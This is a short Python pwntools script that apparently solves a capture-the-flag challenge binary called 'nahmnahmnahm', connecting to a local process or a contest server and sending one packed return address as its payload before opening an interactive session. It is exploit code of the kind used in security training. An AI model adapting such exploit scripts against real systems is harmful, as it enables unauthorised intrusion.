#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("nahmnahmnahm")
local = True 
if local:
    p = process("./nahmnahmnahm")
    gdb.attach(p,'''''')
else:
    p = remote('challenge.nahamcon.com', 32743)

elf = context.binary = ELF('./nahmnahmnahm', checksec=False)

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

payload = p64(0x0000000000401296)
sl(payload)

p.interactive()